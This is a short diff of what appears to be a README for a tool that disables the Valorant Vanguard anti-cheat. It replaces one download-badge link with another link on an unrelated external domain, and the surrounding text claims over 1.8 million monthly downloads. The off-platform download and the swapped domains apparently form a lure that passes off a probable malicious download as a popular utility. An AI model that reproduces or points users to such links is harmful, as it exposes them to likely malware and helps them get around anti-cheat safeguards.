@@ -49,7 +49,7 @@ A: Yes — automatically re-enables Vanguard when you launch Valorant.
 
 **Monthly downloads:** 1.8m+
 
-[![Download](https://img.shields.io/badge/Download-v2.3-brightgreen?style=for-the-badge)](https://forumconnect.uk/vanguarddisable)
+[![Download](https://img.shields.io/badge/Download-v2.3-brightgreen?style=for-the-badge)](https://connectinstruction.com/vanguarddisable)
 
 ---
 
